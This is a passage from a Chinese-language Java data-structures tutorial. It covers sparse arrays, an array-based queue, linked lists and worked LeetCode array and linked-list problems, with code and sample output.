遍历二维数组，得到有效值个数 sum\n- 根据 sum 创建稀疏数组 sparseArr = int [sum+1]\\[3]\n- 将有效值存入稀疏数组\n\n还原稀疏数组步骤：\n\n- 创建一个新的数组，其行和列等于稀疏数组首行数据\n\n- 遍历稀疏数组，将对应数值赋值给新的数组\n\n- 最后可以验证一下原始的数组和还原后的数组是否相等\n\n```java\n//稀疏数组：用来减少数据量\npublic class SparseArray {\n    public static void main(String[] args) {\n        // 一、构建原始数组\n        // 创建一个二维数组6*6  0：没有棋子，1：黑棋  2：白棋\n        int[][] chessArr = new int[6][6];\n        chessArr[1][2] = 1;\n        chessArr[2][3] = 2;\n        System.out.println(\"原始数组:\");\n        for (int[] row : chessArr) {\n            for (int data : row) {\n                System.out.print(data+\"\\t\");\n            }\n            System.out.println();\n        }\n        System.out.println(\"====================\");\n\n        // 二、转换成稀疏数组\n        int sum = 0;\n        //1.先遍历二维数组，获取有效值的个数\n        for (int i = 0; i < chessArr.length; i++) {\n            for (int j = 0; j < chessArr[0].length; j++) {\n                if(chessArr[i][j] != 0) {\n                    sum++;//有效值的个数\n                }\n            }\n        }\n        //2.创建对应稀疏数组\n        int [][]sparseArr = new int[sum+1][3];\n        //第一行赋值\n        sparseArr[0][0] = chessArr.length;\n        sparseArr[0][1] = chessArr[0].length;\n        sparseArr[0][2] = sum;\n        //3.遍历初始的二维数组，将非零的值，存放到稀疏数组中\n        int count = 0;\n        for (int i = 0; i < chessArr.length; i++) {\n            for (int j = 0; j < chessArr[0].length; j++) {\n                if (chessArr[i][j] != 0){\n                    count++;\n                    sparseArr[count][0] = i;\n                    sparseArr[count][1] = j;\n                    sparseArr[count][2] = chessArr[i][j];\n                }\n            }\n        }\n        //4.输出稀疏数组\n        System.out.println(\"稀疏数组:\");\n        for (int i = 0; i < sparseArr.length; i++) {\n            System.out.println(sparseArr[i][0]+\"\\t\"+sparseArr[i][1]+\"\\t\"+sparseArr[i][2]+\"\\t\");\n        }\n\n        // 三、还原数组\n        int [][] ChessArr2 = new int[sparseArr[0][0]][sparseArr[0][1]];\n        for (int i = 1; i < sparseArr.length; i++) {\n            ChessArr2[sparseArr[i][0]][sparseArr[i][1]] = sparseArr[i][2];\n        }\n        System.out.println(\"=======================\");\n        //打印还原的数组\n        System.out.println(\"输出还原后的数组：\");\n        for (int[] row : ChessArr2) {\n            for (int data : row) {\n                System.out.print(data+\"\\t\");\n            }\n            System.out.println();\n        }\n\n\n        //四、验证两个数组是否相等，可用Arrays工具类\n        int flag = 0;\n        for (int i = 0; i < chessArr.length; i++) {\n            if (!Arrays.equals(chessArr[i],ChessArr2[i])){\n                flag++;\n            }\n        }\n        if (flag==0){\n            System.out.println(\"初始数组和还原后的数组相等\");\n        }\n    }\n}\n```\n\n### ❷数组模拟队列\n\n队列本身是有序列表，若使用数组的结构来存储队列的数据，则队列数组的声明如下图\n\nmaxSize 是该队列的最大容量，两个变量 front 及 rear 分别记录队列前后端的下标\n\n![](https://img.jwt1399.top/img/202209212055227.png)\n\n```java\nclass ArrayQueue {\n    private int MaxSize;  // 队列大小\n    private int front;   // 队列头\n    private int rear;   // 队列尾\n    private int[] arr; // 数组存放数据\n\n    // 一、创建队列的构造器\n    public ArrayQueue(int MaxSize) {\n        this.MaxSize = MaxSize;\n        arr = new int[this.MaxSize];\n        front = -1;\n        rear = -1;\n    }\n\n    //二、判断队列是否满\n    public boolean isFull() {\n        return rear == MaxSize - 1;\n    }\n\n    //三、判断队列是否空\n    public boolean isEmpty() {\n        return rear == front;\n    }\n\n    //四、入队\n    public void addQueue(int num) {\n        if (isFull()) {\n            System.out.println(\"队列已满，无法在进行入队操作\");\n            return;\n        }\n        arr[++rear] = num;\n    }\n\n    //五、出队\n    public int getQueue() {\n        if (isEmpty()) {\n            throw new RuntimeException(\"队列为空，无法出队\");\n        }\n        return arr[++front];\n    }\n\n    //六、显示队列数据\n    public void showQueue() {\n        if (isEmpty()) {\n            throw new RuntimeException(\"队列为空，无法遍历\");\n        }\n        for (int i = front+1; i < arr.length; i++) {\n            System.out.printf(\"arr[%d]=%d\\n\", i, arr[i]);\n        }\n    }\n\n    //七、显示队列头数据\n    public int headQueue() {\n        if (isEmpty()) {\n            throw new RuntimeException(\"队列为空，没有数据\");\n        }\n        return arr[front + 1];\n    }\n\n}\n```\n\n测试\n\n```java\npublic class ArrayQueueDemo {\n    public static void main(String[] args) {\n        // 构造队列\n        ArrayQueue queue = new ArrayQueue(5);\n        // 入队\n        queue.addQueue(1);\n        queue.addQueue(2);\n        queue.addQueue(3);\n        queue.addQueue(4);\n        queue.addQueue(5);\n        // 出队\n        System.out.println(queue.getQueue());\n        // 遍历队列\n        queue.showQueue();\n        // 队首\n        System.out.println(queue.headQueue());\n\n    }\n}\n```\n\n### ❸LeetCode真题\n\n#### 二分法：[704. 二分查找 ](https://leetcode.cn/problems/binary-search/)\n\n给定一个 `n` 个元素有序的（升序）整型数组 `nums` 和一个目标值 `target`  ，写一个函数搜索 `nums` 中的 `target`，如果目标值存在返回下标，否则返回 `-1`。\n\n\n**示例 1:**\n\n```properties\n输入: nums = [-1,0,3,5,9,12], target = 9\n输出: 4\n解释: 9 出现在 nums 中并且下标为 4\n```\n\n**示例 2:**\n\n```properties\n输入: nums = [-1,0,3,5,9,12], target = 2\n输出: -1\n解释: 2 不存在 nums 中因此返回 -1\n```\n\n```java\nclass Solution {\n    public int search(int[] nums, int target) {\n        // 避免当 target 小于nums[0] 大于nums[nums.length - 1]时多次循环运算\n        if (target < nums[0] || target > nums[nums.length - 1]) {\n            return -1;\n        }\n        int left = 0;\n        int right = nums.length - 1;\n        while(left <= right){\n            int mid = left + ((right - left) >> 1);// 防止溢出 等同于(left + right)/2\n            if(nums[mid] == target){\n                return mid;\n            }\n            else if(nums[mid] < target){\n                left = mid + 1;\n            }else{\n                right = mid -1;\n            }\n        }\n        return -1;\n    }\n}\n```\n\n#### 双指针：[27. 移除元素](https://leetcode.cn/problems/remove-element/)\n\n给你一个数组 `nums` 和一个值 `val`，你需要原地移除所有数值等于 `val` 的元素，并返回移除后数组的新长度。\n\n不要使用额外的数组空间，你必须仅使用 `O(1)` 额外空间并原地修改输入数组。\n\n元素的顺序可以改变。你不需要考虑数组中超出新长度后面的元素。\n\n```java\nclass Solution {\n    public int removeElement(int[] nums, int val) {\n        //快慢指针解法\n        int slow = 0; //慢指针\n        //快指针，无论与val值是否相同每遍历一次都要移动一位\n        for(int fast = 0; fast < nums.length; fast++){\n            //快指针先走，判断快指针指向的元素是否等于val\n            if(nums[fast] != val){\n                nums[slow] = nums[fast];\n                slow++;  //只有当快指针不等于val的时候，慢指针才和快指针一起移动一位\n            }\n        }\n        return slow;\n    }\n}\n\nclass Solution {\n    public int removeElement(int[] nums, int val) {\n        int idx = 0;\n        for (int x : nums) {\n            if (x != val) nums[idx++] = x;\n        }\n        return idx;\n    }\n}\n```\n\n#### 双指针：[977. 有序数组的平方](https://leetcode.cn/problems/squares-of-a-sorted-array/)\n\n给你一个按 **非递减顺序** 排序的整数数组 `nums`，返回 **每个数字的平方** 组成的新数组，要求也按 **非递减顺序** 排序。\n\n**示例 1：**\n\n```properties\n输入：nums = [-4,-1,0,3,10]\n输出：[0,1,9,16,100]\n解释：平方后，数组变为 [16,1,0,9,100]\n排序后，数组变为 [0,1,9,16,100]\n```\n\n**示例 2：**\n\n```properties\n输入：nums = [-7,-3,2,3,11]\n输出：[4,9,9,49,121]\n```\n\n```java\n//时间复杂度是 O(n + nlogn)\nclass Solution {\n    public int[] sortedSquares(int[] nums) {\n        for(int i = 0 ; i < nums.length; i++){\n            nums[i] = nums[i] * nums[i];\n        }\n        Arrays.sort(nums);\n        return nums;\n    }\n}\n\n//时间复杂度为 O(n)\nclass Solution {\n    public int[] sortedSquares(int[] nums) {\n        int[] res = new int[nums.length];\n        int i = 0, j = nums.length - 1, k = nums.length - 1;\n        while(i <= j){\n            if(nums[i]*nums[i] > nums[j] * nums[j]){\n                res[k--] =  nums[i] * nums[i];\n                i++;\n            }\n            else{\n                res[k--] =  nums[j] * nums[j];\n                j--;\n            }\n        }\n        return res;\n    }\n}\n```\n\n#### 滑动窗口：[209. 长度最小的子数组](https://leetcode.cn/problems/minimum-size-subarray-sum/)\n\n给定一个含有 `n` 个正整数的数组和一个正整数 `target` **。**\n\n找出该数组中满足其和 `≥ target` 的长度最小的 **连续子数组** `[nums<sub>l</sub>, nums<sub>l+1</sub>, ..., nums<sub>r-1</sub>, nums<sub>r</sub>]` ，并返回其长度**。**如果不存在符合条件的子数组，返回 `0` \n\n**示例 1：**\n\n```properties\n输入：target = 7, nums = [2,3,1,2,4,3]\n输出：2\n解释：子数组 [4,3] 是该条件下的长度最小的子数组。\n```\n\n**示例 2：**\n\n```properties\n输入：target = 4, nums = [1,4,4]\n输出：1\n```\n\n**示例 3：**\n\n```properties\n输入：target = 11, nums = [1,1,1,1,1,1,1,1]\n输出：0\n```\n\n```java\n//时间复杂度 O(n^2)\nclass Solution {\n    public int minSubArrayLen(int target, int[] nums) {\n        int res = Integer.MAX_VALUE;\n        int sum = 0;\n        int sumLen = 0;\n        for(int i = 0 ; i < nums.length; i++){\n            sum = 0;\n            for(int j = i; j < nums.length; j++){\n                sum += nums[j];\n                if(sum >= target){\n                    sumLen = j - i + 1;\n                    res = res > sumLen ? sumLen : res;\n                    break;\n                }\n            } \n        }\n        return res == Integer.MAX_VALUE ? 0 : res;\n    }\n}\n\n//时间复杂度 O(n)\nclass Solution {\n    // 滑动窗口\n    public int minSubArrayLen(int s, int[] nums) {\n        int left = 0;\n        int sum = 0;\n        int result = Integer.MAX_VALUE;\n        for (int right = 0; right < nums.length; right++) {\n            sum += nums[right];\n            while (sum >= s) {\n                result = Math.min(result, right - left + 1);\n                sum -= nums[left];\n                left++;\n            }\n        }\n        return result == Integer.MAX_VALUE ? 0 : result;\n    }\n}\n```\n\n#### 模拟法： [59. 螺旋矩阵 II](https://leetcode.cn/problems/spiral-matrix-ii/)\n\n给你一个正整数 `n` ，生成一个包含 `1` 到 `n<sup>2</sup>` 所有元素，且元素按顺时针顺序螺旋排列的 `n x n` 正方形矩阵 `matrix` 。\n\n**示例 1：**\n\n![](https://assets.leetcode.com/uploads/2020/11/13/spiraln.jpg)\n\n```properties\n输入：n = 3\n输出：[[1,2,3],[8,9,4],[7,6,5]]\n```\n\n**示例 2：**\n\n```properties\n输入：n = 1\n输出：[[1]]\n```\n\n思路：\n\n-   生成一个 `n×n` 空矩阵 `res`，随后模拟整个向内环绕的填入过程：\n    -   定义当前左右上下边界 `l,r,t,b`，初始值 `num = 1`，迭代终止值 `end = n * n`；\n    -   当 `num <= end` 时，始终按照 `从左到右` `从上到下` `从右到左` `从下到上` 填入顺序循环，每次填入后：\n        -   执行 `num += 1`：得到下一个需要填入的数字；\n        -   更新边界：例如从左到右填完后，上边界 `t += 1`，相当于上边界向内缩 1。\n    -   使用`num <= end`而不是`l < r || t < b`作为迭代条件，是为了解决当`n`为奇数时，矩阵中心数字无法在迭代过程中被填充的问题。\n-   最终返回 `res` 即可。\n\n```java\nclass Solution {\n    public int[][] generateMatrix(int n) {\n        int l = 0, r = n - 1, t = 0, b = n - 1;\n        int[][] res = new int[n][n];\n        int num = 1, end = n * n;\n        while(num <= end){\n            for(int i = l; i <= r; i++) res[t][i] = num++; // left to right.\n            t++;\n            for(int i = t; i <= b; i++) res[i][r] = num++; // top to bottom.\n            r--;\n            for(int i = r; i >= l; i--) res[b][i] = num++; // right to left.\n            b--;\n            for(int i = b; i >= t; i--) res[i][l] = num++; // bottom to top.\n            l++;\n        }\n        return res;\n    }\n}\n```\n\n#### 模拟法：[915. 分割数组](https://leetcode.cn/problems/partition-array-into-disjoint-intervals/description/)\n\n给定一个数组 `nums` ，将其划分为两个连续子数组 `left` 和 `right`， 使得：\n\n-   `left` 中的每个元素都小于或等于 `right` 中的每个元素。\n-   `left` 和 `right` 都是非空的。\n-   `left` 的长度要尽可能小。\n\n在完成这样的分组后返回 `left` 的 **长度**。\n\n用例可以保证存在这样的划分方法。\n\n**示例 1：**\n\n```properties\n输入：nums = [5,0,3,8,6]\n输出：3\n解释：left = [5,0,3]，right = [8,6]\n```\n\n**示例 2：**\n\n```properties\n输入：nums = [1,1,1,0,6,12]\n输出：4\n解释：left = [1,1,1,0]，right = [6,12]\n```\n\n**两次遍历：O(n)**\n\n- 先通过一次遍历（从后往前）统计出所有**后缀的最小值** `minRight`（使用数组进行维护）\n\n- 然后再通过第二次遍历（从前往后）统计每个**前缀的最大值** `maxLeft`（使用单变量进行维护）\n- 第一个满足 `maxLeft ≤ minRight[i + 1]` 的 i 即为答案，此时 left 的长度为 i+1，因此答案需返回 i+1。\n\n```java\nclass Solution {\n    public int partitionDisjoint(int[] nums) {\n        int[] minRight = new int[nums.length];\n        minRight[nums.length - 1] = nums[nums.length - 1];\n        for(int i = nums.length - 2; i >= 0; i--){\n            minRight[i] = Math.min(nums[i], minRight[i + 1]);\n        }\n        int maxLeft = 0;\n        for(int i = 0; i < nums.length - 1; i++){\n            maxLeft = Math.max(maxLeft, nums[i]);\n            if(maxLeft <= minRight[i + 1]){\n                return i + 1;\n            }\n        }\n        return 0;\n    }\n}\n```\n\n#### 哈希表：[1. 两数之和](https://leetcode.cn/problems/two-sum/description/)\n\n给定一个整数数组 `nums` 和一个整数目标值 `target`，请你在该数组中找出 **和为目标值** _`target`_  的那 **两个** 整数，并返回它们的数组下标。\n\n你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。\n\n你可以按任意顺序返回答案。\n\n**示例 1：**\n\n```properties\n输入：nums = [2,7,11,15], target = 9\n输出：[0,1]\n解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。\n```\n\n**示例 2：**\n\n```properties\n输入：nums = [3,2,4], target = 6\n输出：[1,2]\n```\n\n**示例 3：**\n\n```properties\n输入：nums = [3,3], target = 6\n输出：[0,1]\n```\n\n**进阶：**你可以想出一个时间复杂度小于 O(n<sup>2</sup>) 的算法吗？\n\n```java\n//暴力法O(n^2)\nclass Solution {\n    public int[] twoSum(int[] nums, int target) {\n        for(int i = 0; i < nums.length; i++){\n            for(int j = i + 1; j < nums.length; j++){\n                if(nums[i] + nums[j] == target){\n                    return new int[]{i,j};\n                }\n            }\n        }\n        return new int[0];\n    }\n}\n//哈希表O(n)\nclass Solution {\n    public int[] twoSum(int[] nums, int target) {\n        HashMap<Integer,Integer> map = new HashMap<>();\n        for(int i = 0; i < nums.length; i++){\n            if(map.containsKey(target - nums[i])){\n                return new int[]{map.get(target - nums[i]),i};\n            }\n            map.put(nums[i],i);\n        }\n        return new int[0];\n    }\n}\n```\n\n## ②链表\n\n### ❶单向链表\n\n**特点**\n\n- 链表是以节点的方式来存储，**是链式存储**\n- 每个节点包含 data 域 （存储数据），next 域（指向下一个节点）\n- 链表的各个节点不一定是连续存储的\n- 链表分**带头节点的链表**和**没有头节点的链表**，根据实际的需求来确定\n\n```java\n/**\n * 定义节点\n */\nclass StudentNode {\n    int id;\n    String name;\n    StudentNode next;\n\n    public StudentNode(int id, String name) {\n        this.id = id;\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"StudentNode{\" +\n                \"id=\" + id +\n                \", name='\" + name + '\\'' +\n                '}';\n    }\n}\n\n/**\n * 创建链表\n */\nclass singleLinkedList {\n    //头节点，防止被修改，设置为私有的\n    private StudentNode head = new StudentNode(0, \"\");\n\n    //插入节点\n    public void addNode(StudentNode node) {\n        //因为头节点不能被修改，所以创建一个辅助节点\n        StudentNode temp = head;\n        //找到最后一个节点\n        while (temp.next != null) {\n            temp = temp.next;\n        }\n        temp.next = node;\n    }\n\n    //按id顺序插入节点\n    public void addByOrder(StudentNode node) {\n        //如果没有首节点，就直接插入\n        if (head.next == null) {\n            head.next = node;\n            return;\n        }\n        //辅助节点，用于找到插入位置和插入操作\n        StudentNode temp = head;\n        //节点的下一个节点存在，且它的id小于要插入节点的id，就继续下移\n        while (temp.next != null && temp.next.id < node.id) {\n            temp = temp.next;\n        }\n        //如果temp的下一个节点存在，则执行该操作\n        //且插入操作，顺序不能换\n        if (temp.next != null) {\n            node.next = temp.next;\n        }\n        temp.next = node;\n    }\n\n    //遍历链表\n    public void traverseNode() {\n        if (head.next == null) {\n            System.out.println(\"链表为空\");\n        }\n        StudentNode temp = head;\n        while (temp.next != null) {\n            System.out.println(temp.next);\n            temp = temp.next;\n        }\n    }\n\n    //根据id来修改节点信息\n    public void changeNode(StudentNode node) {\n        if (head == null) {\n            System.out.println(\"链表为空，请先加入该学生信息\");\n            return;\n        }\n        StudentNode temp = head;\n        //遍历链表，找到要修改的节点\n        while (temp.next != null && temp.id != node.id) {\n            temp = temp.next;\n        }\n        //如果temp已经是最后一个节点，判断id是否相等\n        if (temp.id != node.id) {\n            System.out.println(\"未找到该学生的信息，请先创建该学生的信息\");\n            return;\n        }\n        //修改信息\n        temp.name = node.name;\n    }\n\n    //删除节点\n    public void deleteNode(StudentNode node) {\n        if (head.next == null) {\n            System.out.println(\"链表为空\");\n            return;\n        }\n        StudentNode temp = head;\n        //遍历链表，找到要删除的节点\n        while (temp.next != null && temp.next.id != node.id) {\n            temp = temp.next;\n        }\n        if(temp.next == null){\n            System.out.println(\"要删除的节点不存在\");\n            return;\n        }\n        //删除该节点\n        temp.next = temp.next.next;\n\n    }\n\n    //得到第index个的节点\n    public StudentNode getNodeByIndex(int index) {\n        if (head.next == null) {\n            System.out.println(\"链表为空!\");\n        }\n        StudentNode temp = head;\n        int length = 0;\n        while (temp.next != null) {\n            temp = temp.next;\n            length++;\n        }\n        if (index > length) {\n            throw new RuntimeException(\"链表越界\");\n        }\n\n        temp = head;\n        for (int i = 0; i < index; i++) {\n            temp = temp.next;\n        }\n        return temp;\n    }\n\n    //逆序遍历\n    public void reverseTraverse() {\n        if (head == null) {\n            System.out.println(\"链表为空\");\n        }\n        StudentNode temp = head;\n        //创建栈，用于存放遍历到的节点\n        Stack<StudentNode> stack = new Stack<>();\n        while (temp.next != null) {\n            stack.push(temp.next);\n            temp = temp.next;\n        }\n        while (!stack.isEmpty()) {\n            System.out.println(stack.pop());\n        }\n    }\n}  \n  \n  \n public class SingleLinkedListDemo {\n    public static void main(String[] args) {\n\n        singleLinkedList linkedList = new singleLinkedList();\n\n        //创建学生节点，并插入链表\n        System.out.println(\"插入节点1和3：\");\n        StudentNode student1 = new StudentNode(1, \"Jack\");\n        StudentNode student3 = new StudentNode(3, \"Tom\");\n        linkedList.addNode(student1);\n        linkedList.addNode(student3);\n        linkedList.traverseNode();\n\n        //按id大小插入\n        System.out.println(\"有序插入节点2：\");\n        StudentNode student2 = new StudentNode(2, \"Jerry\");\n        linkedList.addByOrder(student2);\n        linkedList.traverseNode();\n\n        //按id修改学生信息\n        System.out.println(\"修改节点1信息：\");\n        student2 = new StudentNode(1, \"Jack2\");\n        linkedList.changeNode(student2);\n        linkedList.traverseNode();\n\n        //获得第2个节点\n        System.out.println(\"获得第2个节点：\");\n        System.out.println(linkedList.getNodeByIndex(2));\n\n        //根据id删除学生信息\n        System.out.println(\"删除学生信息：\");\n        student2 = new StudentNode(1, \"Jack2\");\n        linkedList.deleteNode(student2);\n        linkedList.traverseNode();\n        \n        //倒叙遍历链表\n        System.out.println(\"倒序遍历链表：\");\n        linkedList.reverseTraverse();\n\n    }\n} \n```\n\n```\n链表为空\n\n插入节点1和3：\nStudentNode{id=1, name='Jack'}\nStudentNode{id=3, name='Tom'}\n有序插入节点2：\nStudentNode{id=1, name='Jack'}\nStudentNode{id=2, name='Jerry'}\nStudentNode{id=3, name='Tom'}\n修改节点1信息：\nStudentNode{id=1, name='Jack2'}\nStudentNode{id=2, name='Jerry'}\nStudentNode{id=3, name='Tom'}\n获得第2个节点：\nStudentNode{id=2, name='Jerry'}\n删除学生信息：\nStudentNode{id=2, name='Jerry'}\nStudentNode{id=3, name='Tom'}\n倒序遍历链表：\nStudentNode{id=3, name='Tom'}\nStudentNode{id=2, name='Jerry'}\n```\n\n\n\n### ❷双向链表\n\n```java\nclass HeroNode {\n    int id;\n    String name;\n    HeroNode next;\n    HeroNode pre;\n\n    public HeroNode(int id, String name) {\n        this.id = id;\n        this.name = name;\n    }\n\n    @Override\n    public String toString() {\n        return \"HeroNode{id=\" + id + \", name=\" + name + \"}\";\n    }\n}\n\n\n/**\n * 创建一个双向链表的类\n */\nclass DoubleLinkedList {\n\n    //初始化一个头节点，头节点不动，不存放具体的数据\n    HeroNode head = new HeroNode(0, \"\");\n    //初始化一个尾节点，指向最后一个元素，默认等于head\n    HeroNode tail = head;\n\n    //遍历打印双向链表的方法\n    public void list() {\n        if (head.next == null) {\n            System.out.println(\"链表为空\");\n            return;\n        }\n        HeroNode temp = head.next;\n        while (temp != null) {\n            System.out.println(temp);\n            temp = temp.next;\n        }\n    }\n\n    //新增节点\n    public void add(HeroNode heroNode) {\n        tail.next = heroNode;\n        heroNode.pre = tail;\n        tail = heroNode;\n    }\n\n    //有序新增节点\n    public void addByOrder(HeroNode heroNode) {\n        HeroNode temp = head;\n        // 标记添加的编号是否已经存在\n        boolean flag = false;\n        while (temp.next != null && temp.next.id <= heroNode.id) {\n            if (temp.next.id == heroNode.id) {\n                flag = true;\n            }\n            temp = temp.next;\n        }\n        // 判断flag\n        if (flag) {\n            System.out.printf(\"英雄编号【%d】已经存在了\\n\", heroNode.id);\n        } else {\n            // 插入到链表中\n            // 1、将【heroNode的next】设置为【temp的next】\n            heroNode.next = temp.next;\n            // 判断是不是加在链表最后\n            if (temp.next != null) {\n                // 2、将【temp的next的pre】设为为【heroNode】\n                temp.next.pre = heroNode;\n            }\n            // 3、将【temp的next】设置为【heroNode】\n            temp.next = heroNode;\n            // 4、将【heroNode的pre】设置为【temp】\n            heroNode.pre = temp;\n        }\n    }\n\n    //修改节点\n    public void update(HeroNode heroNode) {\n        // 判断是否为空\n        if (head.next == null) {\n            System.out.println(\"链表为空~~\");\n            return;\n        }\n        // 找到需要修改的节点\n        HeroNode temp = head.next;\n        // 表示是否找到这个节点\n        boolean flag = false;\n        while (temp != null) {\n            if (temp.id == heroNode.id) {\n                flag = true;\n                break;\n            }\n            temp = temp.next;\n        }\n        // 根据flag判断是否找到要修改的节点\n        if (flag) {\n            temp.name = heroNode.name;\n        } else { // 没有找到\n            System.out.printf(\"没有找到编号为 %d 的节点，不能修改\\n\", heroNode.id);\n        }\n    }\n\n    //删除节点\n    public void delete(int id) {\n        // 判断当前链表是否为空\n        if (head.next == null) {\n            System.out.println(\"链表为空，无法删除\");\n            return;\n        }\n        HeroNode temp = head;\n        // 标志是否找到删除节点\n        boolean flag = false;\n        while (temp.next != null) {\n            // 已经找到链表的最后\n            if (temp.id == id) {\n                // 找到待删除节点\n                flag = true;\n                break;\n            }\n            temp = temp.next;\n        }\n        // 判断flag，此时找到要删除的节点就是temp\n        if (flag) {\n            // 可以删除，将【temp的pre的next域】设置为【temp的next域】\n            temp.pre.next = temp.next;\n            // 如果是最后一个节点，就不需要指向下面这句话，否则会出现空指针 temp.next.pre = null.pre\n            if (temp.next != null) {\n                temp.next.pre = temp.pre;\n            }\n        }\n    }\n\n}\n\n\npublic class DoubleLinkedListDemo {\n    public static void main(String[] args) {\n        System.out.println(\"双向链表:\");\n        // 创建节点\n        HeroNode her1 = new HeroNode(1, \"宋江\");\n        HeroNode her2 = new HeroNode(2, \"卢俊义\");\n        HeroNode her3 = new HeroNode(3, \"吴用\");\n        HeroNode her4 = new HeroNode(4, \"林冲\");\n        // 创建一个双向链表对象\n        DoubleLinkedList doubleLinkedList = new DoubleLinkedList();\n        doubleLinkedList.add(her1);\n        doubleLinkedList.add(her2);\n        doubleLinkedList.add(her3);\n        doubleLinkedList.add(her4);\n        doubleLinkedList.list();\n\n        // 修改\n        HeroNode newHeroNode = new HeroNode(4, \"公孙胜\");\n        doubleLinkedList.update(newHeroNode);\n        System.out.println(\"修改节点4:\");\n        doubleLinkedList.list();\n\n        // 删除\n        doubleLinkedList.delete(3);\n        System.out.println(\"删除节点3\");\n        doubleLinkedList.list();\n        // 测试有序新增\n        System.out.println(\"测试有序增加链表：\");\n        DoubleLinkedList doubleLinkedList1 = new DoubleLinkedList();\n        doubleLinkedList1.addByOrder(her3);\n        doubleLinkedList1.addByOrder(her2);\n        doubleLinkedList1.addByOrder(her2);\n        doubleLinkedList1.addByOrder(her4);\n        doubleLinkedList1.addByOrder(her4);\n        doubleLinkedList1.addByOrder(her2);\n        doubleLinkedList1.addByOrder(her1);\n        doubleLinkedList1.list();\n\n    }\n}\n```\n\n```\n双向链表:\nHeroNode{id=1, name=宋江}\nHeroNode{id=2, name=卢俊义}\nHeroNode{id=3, name=吴用}\nHeroNode{id=4, name=林冲}\n修改节点4:\nHeroNode{id=1, name=宋江}\nHeroNode{id=2, name=卢俊义}\nHeroNode{id=3, name=吴用}\nHeroNode{id=4, name=公孙胜}\n删除节点3\nHeroNode{id=1, name=宋江}\nHeroNode{id=2, name=卢俊义}\nHeroNode{id=4, name=公孙胜}\n测试有序增加链表：\n英雄编号【2】已经存在了\n英雄编号【4】已经存在了\n英雄编号【2】已经存在了\nHeroNode{id=1, name=宋江}\nHeroNode{id=2, name=卢俊义}\nHeroNode{id=3, name=吴用}\nHeroNode{id=4, name=公孙胜}\n```\n\n### ❸循环链表\n\n\n\n### ❹LeetCode真题\n\n#### [203. 移除链表元素](https://leetcode.cn/problems/remove-linked-list-elements/)\n\n给你一个链表的头节点 `head` 和一个整数 `val` ，请你删除链表中所有满足 `Node.val == val` 的节点，并返回 **新的头节点** 。\n\n**示例 1：**\n\n```\n输入：head = [1,2,6,3,4,5,6], val = 6\n输出：[1,2,3,4,5]\n```\n\n**示例 2：**\n\n```\n输入：head = [], val = 1\n输出：[]\n```\n\n**示例 3：**\n\n```\n输入：head = [7,7,7,7], val = 7\n输出：[]\n```\n\n\n\n```java\n/**\n * 添加虚节点方式\n * 时间复杂度 O(n)\n * 空间复杂度 O(1)\n */\npublic ListNode removeElements(ListNode head, int val) {\n    if (head == null) {\n        return head;\n    }\n    // 因为删除可能涉及到头节点，所以设置dummy节点，统一操作\n    ListNode dummy = new ListNode(-1, head);\n    ListNode pre = dummy;\n    ListNode cur = head;\n    while (cur != null) {\n        if (cur.val == val) {\n            pre.next = cur.next;\n        } else {\n            pre = cur;\n        }\n        cur = cur.next;\n    }\n    return dummy.next;\n}\n\n\n\n/**\n * 不添加虚拟节点and pre Node方式\n * 时间复杂度 O(n)\n * 空间复杂度 O(1)\n */\nclass Solution {\n    public ListNode removeElements(ListNode head, int val) {\n       //去除开头节点\n        while(head != null && head.val == val){\n            head = head.next;\n        }\n        ListNode cur = head;\n        while(cur != null){\n            while(cur.next != null && cur.next.val == val){\n                cur.next = cur.next.next;\n            }\n            cur = cur.next;\n        }\n        return head;\n    }\n}\n```\n\n#### [707. 设计链表](https://leetcode.cn/problems/design-linked-list/)\n\n设计链表的实现。您可以选择使用单链表或双链表。单链表中的节点应该具有两个属性：`val` 和 `next`。`val` 是当前节点的值，`next` 是指向下一个节点的指针/引用。如果要使用双向链表，则还需要一个属性 `prev` 以指示链表中的上一个节点。假设链表中的所有节点都是 0-index 的。\n\n在链表类中实现这些功能：\n\n-   get(index)：获取链表中第 `index` 个节点的值。如果索引无效，则返回`-1`。\n-   addAtHead(val)：在链表的第一个元素之前添加一个值为 `val` 的节点。插入后，新节点将成为链表的第一个节点。\n-   addAtTail(val)：将值为 `val` 的节点追加到链表的最后一个元素。\n-   addAtIndex(index,val)：在链表中的第 `index` 个节点之前添加值为 `val`  的节点。如果 `index` 等于链表的长度，则该节点将附加到链表的末尾。如果 `index` 大于链表长度，则不会插入节点。如果`index`小于0，则在头部插入节点。\n-   deleteAtIndex(index)：如果索引 `index` 有效，则删除链表中的第 `index` 个节点。\n\n**示例：**\n\n```\nMyLinkedList linkedList = new MyLinkedList();\nlinkedList.addAtHead(1);\nlinkedList.addAtTail(3);\nlinkedList.addAtIndex(1,2);   //链表变为1-> 2-> 3\nlinkedList.get(1);            //返回2\nlinkedList.deleteAtIndex(1);  //现在链表是1-> 3\nlinkedList.get(1);            //返回3\n```\n\n\n\n```java\n/**\n* 单链表\n*/\nclass ListNode {\n    int val;\n    ListNode next;\n    ListNode(){}\n    ListNode(int val) {\n        this.val=val;\n    }\n}\n\nclass MyLinkedList {\n\n    //size存储链表元素的个数\n    int size;\n    //虚拟头结点\n    ListNode head;\n\n    public MyLinkedList() {\n        size = 0;\n        head = new ListNode(0);\n    }\n    \n    public int get(int index) {\n        if(index < 0 || index >= size) return -1;\n        ListNode cur = head;\n        //包含一个虚拟头节点，所以查找第 index+1 个节点\n        for(int i = 0; i <= index; i++){\n            cur = cur.next;\n        }\n        return cur.val;\n    }\n    \n    public void addAtHead(int val) {\n         addAtIndex(0, val);\n    }\n    \n    public void addAtTail(int val) {\n        addAtIndex(size, val);\n    }\n    \n    public void addAtIndex(int index, int val) {\n        if(index > size) return;\n        if(index < 0) index = 0;\n        ListNode pre = head;\n        ListNode addNode = new ListNode(val);\n        //找到要插入节点的前驱\n        for(int i = 0; i < index; i++){\n            pre = pre.next;\n        }\n        addNode.next = pre.next;\n        pre.next = addNode;\n        size++;\n    }\n    \n\n    public void deleteAtIndex(int index) {\n        if (index < 0 || index >= size) return;\n        ListNode pre = head;\n        //找到要删除节点的前驱\n        for(int i = 0; i < index; i++){\n            pre = pre.next;\n        }\n        pre.next = pre.next.next;\n        size--;\n    }\n}\n\n\n/**\n*双链表\n*/\nclass ListNode {\n    int val;\n    ListNode prev, next;\n    ListNode(){}\n    ListNode(int val) {\n        this.val=val;\n    }\n}\n\nclass MyLinkedList {\n\n    //size存储链表元素的个数\n    int 